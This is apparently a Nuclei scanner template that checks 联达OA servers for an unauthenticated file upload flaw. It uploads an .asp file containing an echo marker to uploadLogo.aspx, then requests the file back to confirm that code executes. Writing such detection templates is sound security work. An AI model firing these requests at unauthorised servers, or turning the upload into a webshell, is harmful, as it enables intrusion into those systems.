id: lianda-oa-uploadlogo-upload

info:
  name: 联达OA uploadLogo.aspx 文件上传漏洞
  author: qwtd
  severity: critical
  tags: 联达OA

http:
  - raw:
      - |
        POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
        Content-Type: multipart/form-data; boundary=boundary=00content0boundary00
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close

        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
        Content-Disposition: form-data; name="DesignId"

        1
        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
        Content-Disposition: form-data; name="Filedata";filename="{{randstr_1}}.asp"

        <% Response.Write("{{randstr_2}}") %>
        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA--

      - |
        @timeout: 30s
        GET /Hosp_Portal/Logo/{{randstr_1}}.asp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200 && contains(body_2, "{{randstr_2}}")'
        condition: and